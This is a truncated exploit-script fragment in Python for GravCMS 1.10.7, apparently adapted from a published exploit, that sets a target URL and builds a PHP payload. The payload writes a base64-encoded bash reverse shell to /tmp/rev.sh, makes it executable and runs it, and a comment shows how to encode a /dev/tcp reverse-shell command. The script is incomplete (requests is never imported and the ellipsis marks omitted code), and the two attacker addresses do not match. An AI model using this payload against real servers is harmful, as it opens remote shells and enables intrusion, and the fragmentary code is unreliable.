# Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update
# Original Exploit Author: Mehmet Ince
# Did not work for me but was on funky setup
# Version: 1.10.7
# Tested on: Debian 10
...
import re
import base64
target= "http://192.168.152.12/grav-admin"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE2Ni80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
